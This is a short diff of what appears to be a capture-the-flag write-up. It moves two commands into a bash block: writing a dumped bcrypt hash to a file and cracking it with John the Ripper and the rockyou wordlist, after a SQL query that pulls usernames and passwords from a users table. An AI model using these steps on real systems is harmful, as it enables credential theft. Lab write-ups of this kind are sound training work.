@@ -259,8 +259,10 @@ select username,password from sd4fg_users;
 
 <br>
 
-`echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > hash`
-`john --wordlist=/usr/share/wordlists/rockyou.txt hash`
+```bash
+echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
 
 ```bash
 Using default input encoding: UTF-8
